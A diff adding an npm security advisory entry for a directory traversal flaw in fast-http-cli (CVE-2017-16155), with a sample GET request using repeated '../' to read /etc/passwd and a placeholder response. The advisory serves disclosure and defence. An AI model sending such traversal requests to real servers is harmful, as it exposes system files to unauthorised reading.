@@ -1,5 +1,40 @@
 ---
-- id: snykio:npm:fast-http-cli:CVE-2017-16155
+- id: npmjs:npm:fast-http-cli:383
+  title: Directory Traversal
+  description: |-
+    `fast-http-cli` is the command line interface for `fast-http`, a simple web server.
+
+    `fast-http-cli` is vulnerable to a directory traversal issue, giving an attacker access to the filesystem by placing "../" in the url.
+
+    Example Request:
+    ```
+    GET /../../../../../../../../../../etc/passwd HTTP/1.1
+    host: localhost
+    ```
+     and server Response:
+    ```
+    HTTP/1.1 200 OK
+    Date: Thu, 04 May 2017 23:59:18 GMT
+    Connection: keep-alive
+    Transfer-Encoding: chunked
+
+    {contents of /etc/passwd}
+    ```
+  affected_package: fast-http-cli
+  vulnerable_versions:
+  - "<=99.999.99999"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2017-16155
+  cwe: CWE-22
+  disclosed_date: 1970-01-01
+  created_date: 1970-01-01
+  last_modified_date: 1970-01-01
+  credit: Liang Gong
+  references: https://npmjs.com/advisories/383
+  source_url: https://npmjs.com/advisories/383
+- id: snykio:npm:fast-http-cli:20170418
   title: Directory Traversal
   description: |
     [`fast-http-cli`][1] is Use fast-http with a command!
